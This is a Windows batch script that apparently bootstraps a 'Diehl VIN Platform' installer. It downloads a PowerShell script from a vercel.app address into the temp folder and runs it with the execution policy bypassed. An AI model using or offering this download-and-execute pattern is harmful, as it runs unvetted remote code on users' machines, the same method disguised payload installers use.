@echo off
setlocal
set PS1=%TEMP%\DiehlVINInitializer.ps1
echo Downloading Diehl VIN Platform initializer...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -UseBasicParsing 'https://diehl-vin-platform.vercel.app/DiehlVINInitializer.ps1' -OutFile '%PS1%'"
if errorlevel 1 (
  echo Could not download the initializer.
  pause
  exit /b 1
)
powershell -NoProfile -ExecutionPolicy Bypass -File "%PS1%"
if errorlevel 1 pause
endlocal
